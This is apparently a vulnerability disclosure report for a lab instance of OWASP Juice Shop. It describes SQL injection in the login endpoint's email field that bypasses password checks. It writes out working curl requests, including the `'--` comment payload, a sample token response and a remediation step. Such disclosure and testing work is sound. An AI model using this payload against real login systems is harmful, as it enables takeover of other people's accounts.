# SQL injection in `POST /rest/user/login` authenticates as any user knowing only their email

- **Asset:** `http://localhost:3000` (OWASP Juice Shop)
- **Weakness:** CWE-89 SQL Injection → authentication bypass (CWE-287)
- **CVSS 3.1:** 9.1 Critical — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

## Summary
The `email` field of `POST /rest/user/login` is concatenated straight into the login SQL query. By
closing the string and commenting out the rest, I logged in as another account with a wrong password and
got a valid session token for it. I proved it against my own second test account, user 26
(`hunter-b@lab.test`); the email is the only account-specific input, so the same request works for any
account whose email is known.

## Steps to reproduce
No account needed; every request carries the UA tag `bountyproof-lab`.

1. Baseline — right account, wrong password → rejected:
   ```
   curl -s -i -A "Mozilla/5.0 bountyproof-lab" -H "Content-Type: application/json" -X POST \
     http://localhost:3000/rest/user/login \
     --data-raw '{"email":"hunter-b@lab.test","password":"bp-wrong-pass"}'
   ```
   → `401 Unauthorized`, `Invalid email or password.`

2. A single quote in `email` reaches the database (injection sensor):
   ```
   curl -s -i -A "Mozilla/5.0 bountyproof-lab" -H "Content-Type: application/json" -X POST \
     http://localhost:3000/rest/user/login \
     --data-raw '{"email":"hunter-b@lab.test'\''","password":"bp-wrong-pass"}'
   ```
   → `500`, stack trace in `sequelize/lib/dialects/sqlite/query.js`.

3. Exploit — close the literal, comment out the password check, keep the wrong password:
   ```
   curl -s -i -A "Mozilla/5.0 bountyproof-lab" -H "Content-Type: application/json" -X POST \
     http://localhost:3000/rest/user/login \
     --data-raw '{"email":"hunter-b@lab.test'\''--","password":"bp-wrong-pass"}'
   ```
   → `200 OK`, `{"authentication":{"token":"<JWT>","bid":7,"umail":"hunter-b@lab.test"}}`

4. Confirm the token is account B (the `Authorization` bearer header alone is sufficient):
   ```
   curl -s -i -A "Mozilla/5.0 bountyproof-lab" -H "Authorization: Bearer <JWT>" \
     http://localhost:3000/rest/user/whoami
   ```
   → `200 OK`, `{"user":{"id":26,"email":"hunter-b@lab.test",...}}`

I avoided a tautology like `' OR 1=1--` (which returns an arbitrary first row); `email'--` selects the
named account. Captures: `poc/H-001/01..04.txt`, `poc/H-001/commands.sh`.

## Impact
An anonymous attacker who knows a user's email can get a valid logged-in session for that account with
no password, in one request. I verified it on my own account B (user 26): wrong password, yet the
returned token resolves to user 26 via `/rest/user/whoami`. That session gives the attacker the account
owner's access — their profile, basket, addresses and orders.

## Remediation
Use parameterised/bound queries for the login lookup so `email` can't change the query structure.

## Notes
Only my own test accounts (A, B) and an anonymous session were used; no other users' data was touched.
A login changes no stored data and B's password was not changed, so nothing needs cleanup.
